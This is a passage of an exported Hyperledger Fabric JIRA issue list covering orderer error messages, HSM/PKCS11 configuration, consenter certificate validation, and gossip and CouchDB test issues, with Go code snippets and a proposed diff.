Fix error message for channel creation failures due to adding orgs that aren't in an (empty) consortium,FAB-17727,44767,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,denyeart,denyeart,10/Apr/20 1:37 AM,20/Nov/20 12:31 PM,28/Oct/23 3:09 AM,20/Nov/20 11:54 AM,,,,,,,,,,v2.2.2,v2.4.0,,,fabric-orderer,,,,,,,,,0,ipm2,,,,,"I accidentally used SampleInsecureSolo profile for the system channel since that is the default for release-1.4:

[https://github.com/hyperledger/fabric/blob/release-1.4/sampleconfig/orderer.yaml#L91]

This profile has no consortium members.
 Then when trying to create a channel, I get error in orderer log:
{code:java}
2020-04-09 11:42:55.648 EDT [orderer.common.broadcast] ProcessMessage -> WARN ab4 [channel: mychannel] Rejecting broadcast of config message from 127.0.0.1:54015 because of error: error validating channel creation transaction for new channel 'mychannel', could not succesfully apply update to template configuration: error authorizing update: error validating ReadSet: existing config does not contain element for [Group]  /Channel/Application/SampleOrg but was in the read set
{code}
The error message was confusing to me, because I looked in my channel config transaction, and I see both a ReadSet and WriteSet containing Application/SampleOrg (and the 'existing config' part of the message was also confusing, because the existing system channel config would never have application groups regardless).

Looking into the NewChannelConfig code, I see comment:
{code:java}
// If the consortium has no members, allow the source request to contain arbitrary members
{code}
[https://github.com/hyperledger/fabric/blob/release-1.4/orderer/common/msgprocessor/systemchannel.go#L295]

So apparently this block of code will silently exclude the application orgs that are in the config update from being in the 'generated' config. The consequence is that eventually the validation against ReadSet will fail against the 'generated config' (not the 'existing config'!) with the above confusing error message.

I'm thinking it would be better NOT to ""allow the source request to contain arbitrary members"", and return an error at that point, rather than silently allowing it but having it fail later on with a confusing message about ReadSet.",,denyeart,jyellick,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00wur:0idqxr",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,jyellick,manish-sethi,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.2,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"10/Apr/20 1:42 AM;denyeart;[~jyellick] What's your opinion on how to best handle this error scenario so that an appropriate error message can be returned?;;;","10/Apr/20 2:59 AM;jyellick;I would be fine with removing the ability to have empty consortiums (thus allowing arbitrary channel creation), this is really only useful in a dev/test scenario.  Keep in mind, we'll need to make this change behind an orderer capability.;;;","10/Apr/20 5:00 AM;denyeart;[~jyellick]Actually I was suggesting a smaller change... just fail the channel creation earlier with a good message, if there are no members in the consortium, at this location:

[https://github.com/hyperledger/fabric/blob/release-1.4/orderer/common/msgprocessor/systemchannel.go#L295]

I think this smaller change would not need a new orderer capability... the behavior would be the same as before, it just fails earlier and with a better error message.;;;","10/Apr/20 5:09 AM;jyellick;We're both on the same page about what the change would be, and where it would be.  But, this still requires a capability change, since it affects a transaction validity decision at the orderer.  If you have two mixed leveled versions of orderers, one could apply the channel creation while the other rejects it.  In this particular scenario, because the transaction was generated via configtxgen, and it (inappropriately) includes the org in the readset, we are getting a failure.  It does not mean that this path always results in failure.;;;","10/Apr/20 9:49 PM;denyeart;Ok, I don't think it is worth making a capability change just for this... I'll plan on just adding a Warning message at this location in the code, that would have been enough to help troubleshoot.;;;","17/Nov/20 3:57 AM;manish-sethi;[~denyeart] - assigning to you, as clearing the backlog.;;;","20/Nov/20 11:45 AM;denyeart;https://github.com/hyperledger/fabric/pull/2149;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add 100ms delay to BCCSP getSession Loop ,FAB-17728,44768,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,caod,btl5037,btl5037,10/Apr/20 2:58 AM,14/May/20 9:46 AM,28/Oct/23 3:09 AM,24/Apr/20 11:04 PM,,,,,,,,,,v1.4.7,v2.0.2,v2.1.1,v2.2.0,fabric-crypto,,,,,,,,,0,ipm,,,,,"When requesting a session from the HSM session cache, if one is not available we attempt to open a new session with the HSM. In this scenario we attempt to open the session 10 times in a row, in a tight loop with no pause between attempts:

[https://github.com/hyperledger/fabric/blob/master/bccsp/pkcs11/pkcs11.go#L93]

We should introduce some delay to try to introduce some stable rate when opening the session instead of blasting the HSM with open session attempts.",,btl5037,caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8zs19",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,caod,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,release-2.1,main,release-2.0,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"24/Apr/20 6:06 AM;caod;[https://github.com/hyperledger/fabric/pull/1157];;;","14/May/20 3:40 AM;caod;1.4: https://github.com/hyperledger/fabric/pull/1253;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
General Logging Clean Up in BCCSP,FAB-17729,44769,,Task,Backlog,FAB,Fabric,software,denyeart,,,Medium,,caod,btl5037,btl5037,10/Apr/20 3:05 AM,28/May/20 3:00 AM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-crypto,,,,,,,,,0,ipm,,,,,"We should address the general logging statements in BCCSP pkcs11. Many of them add no value (or are essentially trace level statement) to someone debugging their HSM configuration.

For example: [https://github.com/hyperledger/fabric/blob/master/bccsp/pkcs11/pkcs11.go#L87]

We are logging the happy and expected path in the code. We should look at the happy paths and add logging statements to the error path, so users can better understand when things arent going well, but aren't inundated with messages when things are going well (gossip causes this message to be logged hundreds of times a minute depending on your gossip settings)",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8zs09",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PKCS11 AWS Configuration item,FAB-17730,44748,,Documentation,Closed,FAB,Fabric,software,denyeart,,,High,Done,pandrejko,ashutosh_kumar,ashutosh_kumar,08/Apr/20 6:02 AM,10/Apr/20 11:06 AM,28/Oct/23 3:09 AM,10/Apr/20 11:04 AM,,,,,,,,,,,,,,,,,,,,,,,0,Documentation,,,,,"For AWS HSM integration , following needs to happen :
 # User needs to create a long Secure String outside of Fabric
 # In BCCSP block assign the value calculated in step 1 to key ""Altid""",,ashutosh_kumar,denyeart,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01apn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),ashutosh_kumar,denyeart,pandrejko,,,,,,,,,,,,release-1.4,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"08/Apr/20 9:50 PM;pandrejko;release-1.4 branch only:

If you are using AWS HSM, you need to add an additional parameter, `Altid` to the `pkcs11` section of the BCCSP block.

Create a long secure string outside of Fabric and assign it to the `Altid` parameter.

Provide an example in the text.

 ;;;","10/Apr/20 11:06 AM;denyeart;Merged in release-1.4: [https://github.com/hyperledger/fabric/pull/1027];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Enable Private key to be immutable after creation in HSM,FAB-17731,44749,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,pandrejko,ashutosh_kumar,ashutosh_kumar,08/Apr/20 6:13 AM,10/Apr/20 11:06 AM,28/Oct/23 3:09 AM,10/Apr/20 11:05 AM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"User has ability to set Private Key to immutable after it is generated by setting up configuration parameter.

Set parameter named  {color:#000000}*immutable* to *true* in BCCSP section as below{color}

 *{color:#000000}immutable: true{color}*

The default behavior is false.

 ",,ashutosh_kumar,denyeart,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01apv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),ashutosh_kumar,denyeart,pandrejko,,,,,,,,,,,,release-1.4,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"10/Apr/20 11:06 AM;denyeart;Merged in release-1.4: https://github.com/hyperledger/fabric/pull/1027;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Address HSM comments ,FAB-17732,44771,,Documentation,Closed,FAB,Fabric,software,denyeart,,,High,Done,pandrejko,pandrejko,pandrejko,10/Apr/20 5:08 AM,17/Apr/20 6:14 AM,28/Oct/23 3:09 AM,17/Apr/20 6:14 AM,v2.0.0,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"[https://hyperledger-fabric.readthedocs.io/en/latest/hsm.html]

1) Port all the changes from [https://github.com/hyperledger/fabric/pull/1027]  to Fabric master and 2.x branches.

2) Address all the unresolved comments in the PR.",,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwrrq:65jjd",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),pandrejko,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,release-2.1,main,release-2.0,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"17/Apr/20 5:40 AM;pandrejko;Master: [https://github.com/hyperledger/fabric/pull/1099]
release-2.1: [https://github.com/hyperledger/fabric/pull/1108]
release-2.0: [https://github.com/hyperledger/fabric/pull/1109]

release 1.4 [https://github.com/hyperledger/fabric/pull/1110];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Validate consenter certs when adding to application channel (and system channel),FAB-17733,44772,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,varadatibm,varadatibm,10/Apr/20 6:40 AM,27/Aug/20 4:32 PM,28/Oct/23 3:09 AM,09/May/20 4:10 AM,,,,,,,,,,v2.1.1,v2.2.0,,,fabric-orderer,,,,,,,,,0,ipm,operator,,,,"When adding a consenter node to the application channel, it is required that they have the relevant MSP that's contributing the node into the Orderer section... Otherwise any invokes on the channel fails since the channel is in a bad state... if they are going from one to two consenter, the channel is in a irrecoverable state.

 We should check and see if the necessary certs are in MSP before allowing a consenter addition",,denyeart,kopaygorodsky,robmurgai,tatsu-sato,varadatibm,wlahti,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-18192,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzz",,,,Unset,Unset,,(Please add steps to reproduce),2.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,kopaygorodsky,robmurgai,tatsu-sato,varadatibm,wlahti,yacovm,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-2.1,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"10/Apr/20 7:15 AM;yacovm;So, basically what you want is that upon adding a new consenter, to attempt to build a validation chain from some root TLS CA downto the supplied TLS certificates of the consenter , and if no such validation chain exists - to return an error to the user?;;;","10/Apr/20 9:19 AM;varadatibm;Yeap! Precisely! (y);;;","07/May/20 4:38 AM;wlahti;I have most of this done but I've hit a blocker. Not sure how this can/should coexist with FAB-17220. Note this comment before the test that was added, which seems to be the opposite of what this story is requesting: https://github.com/hyperledger/fabric/blob/master/integration/raft/config_test.go#L306-L308;;;","07/May/20 5:09 AM;yacovm;I think what you can do, is simply have an orderer with its own TLS root CA, and then you remove its TLS root CA, and restart the orderer.
When you restart the orderer, there will be a new TLS handshake and the other consenters will refuse to connect to it, and you will ensure this is the case. 

This retains testing that the TLS root CAs are dynamically updated upon a config change, and also doesn't interfere with this check, as this check is only for addition and not removal. ;;;","13/May/20 11:15 PM;denyeart;https://github.com/hyperledger/fabric/pull/1223;;;","27/Aug/20 5:57 AM;kopaygorodsky;this feature broke a usecase when you add a MSP along with consenters in a single config update. 
Now I receive  `consensus metadata update for channel config update is invalid: verifying tls client cert with serial number 202563322038103064295345433482878287045550471240: x509: certificate signed by unknown authority`.  This certificate is singed by msp that is being added in this transaction. 
[~yacovm] can we update a list of root CAs from submitted config block before verifying consenter? ;;;","27/Aug/20 6:09 AM;yacovm;I think it broke it because it validates against [the existing configuration|https://github.com/hyperledger/fabric/blob/master/orderer/consensus/etcdraft/chain.go#L957], and not against a simulated one.

{quote}
 Yacov Manevich can we update a list of root CAs from submitted config block before verifying consenter? 
{quote}
I guess we're talking about the same thing, the right way would be to compute a simulated configuration and take the root CAs from it.;;;","27/Aug/20 6:26 AM;kopaygorodsky;yes, exactly. Do we need to reopen this ticket or create a new one? ;;;","27/Aug/20 7:18 AM;yacovm;better create a new one and also link it to this JIRA;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Stopping using GOPATH/bin as install directory for tools,FAB-17735,44789,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,btl5037,btl5037,11/Apr/20 1:48 PM,11/Jan/21 1:36 AM,28/Oct/23 3:09 AM,11/Jan/21 1:36 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"We currently install our tools (gotools.mk) into $GOPATH/bin, this is problematic in that this is the canonical GOBIN and users may have their own versions of our tools installed that we overwrite.

We should instead install the tools into the build path and update all of our scripts to call them directly.",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb8m",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
race: gossip/comm TestCommSend generates thousands of go routines,FAB-17736,44790,,Bug,Unverified,FAB,Fabric,software,denyeart,,,Medium,,,sykesm,sykesm,13/Apr/20 5:53 AM,23/Nov/20 11:37 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-gossip,,,,,,,,,0,ipm2,race,,,,"This is related to failures when running gossip with the race detector enabled. With changes to enable it, we now see the following message in CI (and locally):
{code:java}
race: limit on 8128 simultaneously alive goroutines is exceeded, dying
{code}
What this is saying is that when running a test, that test results in over 8000 unblocked, runnable routines that are ready for execution and scheduling. How can that be?

The implementation of {{TestCommSend}}. spawns two go routines that send messages in a tight for loop. One of the routines waits for {{stopch1}} to close while the other waits for {{stopch2}}. These channels won't close until the test observes 80 messages on the associated connection.
{code:java}
	go func() {
		for {
			emptyMsg := createGossipMsg()
			select {
			case <-stopch1:
				return
			default:
				comm1.Send(emptyMsg, remotePeer(port2))
			}
		}
	}()
{code}
The implementation of {{Send}} is intended to be non-blocking. When we look at the implementation, we see it calling the non-blocking version of send – but from within a go routine.
{code:java}
func (c *commImpl) Send(msg *protoext.SignedGossipMessage, peers ...*RemotePeer) {
	if c.isStopping() || len(peers) == 0 {
		return
	}
	c.logger.Debug(""Entering, sending"", msg, ""to "", len(peers), ""peers"")

	for _, peer := range peers {
		go func(peer *RemotePeer, msg *protoext.SignedGossipMessage) {
			c.sendToEndpoint(peer, msg, nonBlockingSend)
		}(peer, msg)
	}
}
{code}
When you put the two together, you get tens of thousands of go routines calling into {{sendToEndpoint}}. Since these are non-blocking sends, we wouldn't expect the go routines to stick around for long ... so why run {{sendToEndpoint}} in a go routine? Doesn't seem like it would be needed or desired...

It turns out that those thousands of go routines can end up blocked on on locks when {{sendToEndpoint}} calls {{connStore.getConnection}} to get the connection to use for the send. And this is where things get interesting.

The {{getConnection}} implementation always gets an {{RLock}} and an {{Lock}} on the connection store. Then, after getting the {{Lock}}, it releases it gets the {{RLock}} again(!?) and grabs a {{destinationLock}}.
{code:java}
func (cs *connectionStore) getConnection(peer *RemotePeer) (*connection, error) {
	cs.RLock()
	isClosing := cs.isClosing
	cs.RUnlock()

	if isClosing {
		return nil, errors.Errorf(""conn store is closing"")
	}

	pkiID := peer.PKIID
	endpoint := peer.Endpoint

	cs.Lock()
	destinationLock, hasConnected := cs.destinationLocks[string(pkiID)]
	if !hasConnected {
		destinationLock = &sync.Mutex{}
		cs.destinationLocks[string(pkiID)] = destinationLock
	}
	cs.Unlock()

	destinationLock.Lock()

	cs.RLock()
	conn, exists := cs.pki2Conn[string(pkiID)]
	if exists {
		cs.RUnlock()
		destinationLock.Unlock()
		return conn, nil
	}
	cs.RUnlock()
        ...
{code}
The rest of the method tries to create a connection while holding the destination lock. Once that process is done, we do more dancing with the {{RLock}} and the {{Lock}}.

Once {{sendToEndpoint}} gets a usable connection, it calls {{send}} where, on the non-blocking path, the message is either placed in the {{outBuff}} channel or, when the channel is full, dropped on the floor.

Given all that's above, the Test keeps creating lots and lots fo go routines that end up calling into {{getConnection}} and waiting for the {{RLock}} while some other go routine is holding or waiting for the {{Lock}}. Each time the {{Lock}} is dropped, the go routines waiting on {{RLock}} become runnable and, under the right conditions, that means we can have more than 8000 ""active"" go routines.

!commImpl#Send-goroutines.png! 
 !getConnection-lock.svg|width=600,height=300!

 
Local recreation seems to happen pretty regularly when using one CPU:

{code}
GOMAXPROCS=1 GORACE=atexit_sleep_ms=0 go test -p 1 -cpu 1 -race -count 1 -v -run TestCommSend ./gossip/comm
{code}",,sykesm,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"13/Apr/20 5:51 AM;sykesm;commImpl#Send-goroutines.png;https://jira.hyperledger.org/secure/attachment/18215/commImpl%23Send-goroutines.png","13/Apr/20 5:50 AM;sykesm;getConnection-lock.svg;https://jira.hyperledger.org/secure/attachment/18216/getConnection-lock.svg",,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01h80:",,,,Unset,Unset,,GOMAXPROCS=1 GORACE=atexit_sleep_ms=0 go test -p 1 -cpu 1 -race -count 1 -v -run TestCommSend ./gossip/comm,,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,yacovm,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"26/Apr/20 5:57 PM;yacovm;{quote}
Since these are non-blocking sends, we wouldn't expect the go routines to stick around for long ... so why run sendToEndpoint in a go routine? Doesn't seem like it would be needed or desired...
{quote}

The reason is that gossip's connection creation process couples gRPC connection creation and application level authentication together atomically.
When you want to send a message from a higher layer of gossip to a remote endpoint, you also authenticate that peer and this involves in:
(1) Establishing gRPC connection in a blocking manner (WithBlock)
(2) Sending an authentication message and receiving an authentication message to that peer

Before these two things finish, you are blocked.

In retrospect, perhaps what should have been considered is first creating the connection object and its corresponding buffers, and then making it asynchronously connect via delaying the connection creation and authentication, to the serviceConnection().
However this creates a problem... we don't really know what is the PKI-ID of the remote peer we connect to because it might have changed its PKI-ID (if its certificate is changed), so if we put it inside the mapping, and connect to it asynchronously from within the connection handling itself, - we will end up with a goroutine and a connection leak :( 

Anyway, let me try to explain what's going on in the existing code:

{code}
	cs.Lock()
	destinationLock, hasConnected := cs.destinationLocks[string(pkiID)]
	if !hasConnected {
		destinationLock = &sync.Mutex{}
		cs.destinationLocks[string(pkiID)] = destinationLock
	}
	cs.Unlock()
{code}
We need to ensure that only a single goroutine would connect to the endpoint we are trying to connect to.
The reason is that gossip allows only a single connection for any remote peer, and if we'll try to connect concurrently then we'll end up tripping ourselves because the remote peer will drop all attempts but the last one.
Additionally, we want to allow connection attempts to different endpoints concurrently, so we use a lock per destination.

{code}
	destinationLock.Lock()
	cs.RLock()
	conn, exists := cs.pki2Conn[string(pkiID)]
	if exists {
		cs.RUnlock()
		destinationLock.Unlock()
		return conn, nil
	}
	cs.RUnlock()
{code}
We check maybe during the connection to the endpoint, some other goroutine has already connected to it.
{code}
	createdConnection, err := cs.connFactory.createConnection(endpoint, pkiID)
	if err == nil {
		cs.logger.Debugf(""Created new connection to %s, %s"", endpoint, pkiID)
	}

	destinationLock.Unlock()
{code}
Else, we connect to the destination while holding the lock. 
This is probably where the goroutine herd is piling up and I think we should consider either using a Semaphore instead of a lock, and attempting to grab it for an upper limit of time and then giving up.

Anyway, let's continue:
{code}
	cs.Lock()
	delete(cs.destinationLocks, string(pkiID))
	defer cs.Unlock()
{code}
Once we reached this point, we (probably) have a connection in our hands that we established ourselves. 
No point in keeping the destination lock in memory any more, as when we exit this method we will have a connection in the mapping and the destination lock won't be needed anymore at least until the connection would be deleted, so we delete the destination lock and we hold the lock for the rest of the execution of the method.

{code}
	// check again, maybe someone connected to us during the connection creation?
	conn, exists = cs.pki2Conn[string(pkiID)]

	if exists {
		if createdConnection != nil {
			createdConnection.close()
		}
		return conn, nil
	}

	// no one connected to us AND we failed connecting!
	if err != nil {
		return nil, err
	}
{code}

Recall that gossip ensures a single bi-directional connection between each 2 peers, and while we were connecting to the remote peer, the same peer might have connected to us.
That remote peer, while connecting to us - doesn't do it under the destination lock since it is used only for outgoing connections, so as a result the connection might have been registered in the connection mapping (cs.pki2Conn), so we check if it is the case and if so, we discard our connection and close it, returning the connection from the remote peer to us.
Of course, it could be that we failed connecting earlier in our attempt, so we just return error as seen above.

{code}

	// At this point we know the latest PKI-ID of the remote peer.
	// Perhaps we are trying to connect to a peer that changed its PKI-ID.
	// Ensure that we are not already connected to that PKI-ID,
	// and if so - close the old connection in order to keep the latest one.
	// We keep the latest one because the remote peer is going to close
	// our old connection anyway once it sensed this connection handshake.
	if conn, exists := cs.pki2Conn[string(createdConnection.pkiID)]; exists {
		conn.close()
	}

	// at this point in the code, we created a connection to a remote peer
	conn = createdConnection
	cs.pki2Conn[string(createdConnection.pkiID)] = conn
{code}
The above code handles the corner case I mentioned above where we connected to a peer we thought its PKI-ID is X but we discovered it has changed and it's Y now. 
We need to detect if that remote peer has already connected to us, but under its new name. Otherwise we violate the single connection invariant.
{code}

	go conn.serviceConnection()
{code}
Finally, we spawn the goroutine that services the connection.
;;;","26/Apr/20 6:05 PM;yacovm;[~sykesm] what do you think about the following solution?

 
{code:java}
diff --git a/gossip/comm/conn.go b/gossip/comm/conn.go
index 0e375b3db..1213bcb44 100644
--- a/gossip/comm/conn.go
+++ b/gossip/comm/conn.go
@@ -9,6 +9,7 @@ package comm
 import (
 	""context""
 	""sync""
+	""time""
 
 	proto ""github.com/hyperledger/fabric-protos-go/gossip""
 	""github.com/hyperledger/fabric/gossip/common""
@@ -34,13 +35,13 @@ type connFactory interface {
 
 type connectionStore struct {
 	config           ConnConfig
-	logger           util.Logger            // logger
-	isClosing        bool                   // whether this connection store is shutting down
-	shutdownOnce     sync.Once              // ensure shutdown is only called once per connectionStore
-	connFactory      connFactory            // creates a connection to remote peer
-	sync.RWMutex                            // synchronize access to shared variables
-	pki2Conn         map[string]*connection // mapping between pkiID to connections
-	destinationLocks map[string]*sync.Mutex //mapping between pkiIDs and locks,
+	logger           util.Logger              // logger
+	isClosing        bool                     // whether this connection store is shutting down
+	shutdownOnce     sync.Once                // ensure shutdown is only called once per connectionStore
+	connFactory      connFactory              // creates a connection to remote peer
+	sync.RWMutex                              // synchronize access to shared variables
+	pki2Conn         map[string]*connection   // mapping between pkiID to connections
+	destinationLocks map[string]chan struct{} //mapping between pkiIDs and locks,
 	// used to prevent concurrent connection establishment to the same remote endpoint
 }
 
@@ -49,7 +50,7 @@ func newConnStore(connFactory connFactory, logger util.Logger, config ConnConfig
 		connFactory:      connFactory,
 		isClosing:        false,
 		pki2Conn:         make(map[string]*connection),
-		destinationLocks: make(map[string]*sync.Mutex),
+		destinationLocks: make(map[string]chan struct{}),
 		logger:           logger,
 		config:           config,
 	}
@@ -70,18 +71,28 @@ func (cs *connectionStore) getConnection(peer *RemotePeer) (*connection, error)
 	cs.Lock()
 	destinationLock, hasConnected := cs.destinationLocks[string(pkiID)]
 	if !hasConnected {
-		destinationLock = &sync.Mutex{}
+		destinationLock = make(chan struct{}, 1)
 		cs.destinationLocks[string(pkiID)] = destinationLock
 	}
 	cs.Unlock()
 
-	destinationLock.Lock()
+	destinationLockTimeout := time.NewTimer(time.Second)
+	var timedOut bool
+	select {
+	case destinationLock <- struct{}{}:
+	case destinationLockTimeout.C:
+		timedOut = true
+	}
+
+	if timedOut {
+		return nil, errors.Errorf(""timed out waiting for connection establishment"")
+	}
 
 	cs.RLock()
 	conn, exists := cs.pki2Conn[string(pkiID)]
 	if exists {
 		cs.RUnlock()
-		destinationLock.Unlock()
+		<-destinationLock
 		return conn, nil
 	}
 	cs.RUnlock()
@@ -91,7 +102,7 @@ func (cs *connectionStore) getConnection(peer *RemotePeer) (*connection, error)
 		cs.logger.Debugf(""Created new connection to %s, %s"", endpoint, pkiID)
 	}
 
-	destinationLock.Unlock()
+	<-destinationLock
 
 	cs.RLock()
 	isClosing = cs.isClosing

 {code};;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
test flake in TestHandleChaincodeDeployErroneousIndexFile,FAB-17737,44791,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,13/Apr/20 11:32 AM,13/Apr/20 10:49 PM,28/Oct/23 3:09 AM,13/Apr/20 10:49 PM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ci-flake,,,,,"As per CI statistics, this task has failed 152 times across 173 pipeline runs in the last 14 days. 

The potential reason for this error is that the CouchDB creates an index in the background and responds to the REST API immediately. Currently, we wait only for 100 milliseconds to allow CouchDB to build the index. This fails even in the local laptop test. We can try to increase the time to 2 seconds and allow ample time for CouchDB to build the index. 

{code:java}
--- FAIL: TestHandleChaincodeDeployErroneousIndexFile (0.47s)
 statecouchdb_test.go:39: Initializing TestVDBEnv
 statecouchdb_test.go:741:
 Error Trace: statecouchdb_test.go:741
 Error: Received unexpected error:
 error handling CouchDB request. Error:no_usable_index, Status Code:400, Reason:No index exists for this sort, try indexing by the sort fields.
 github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/statedb/statecouchdb.(*couchInstance).handleRequest
 /Users/senthil/go/src/github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/statedb/statecouchdb/couchdb.go:1880
 github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/statedb/statecouchdb.(*couchDatabase).handleRequest
 /Users/senthil/go/src/github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/statedb/statecouchdb/couchdb.go:1689
 github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/statedb/statecouchdb.(*couchDatabase).queryDocuments
 /Users/senthil/go/src/github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/statedb/statecouchdb/couchdb.go:1094
 github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/statedb/statecouchdb.(*queryScanner).executeQueryWithBookmark
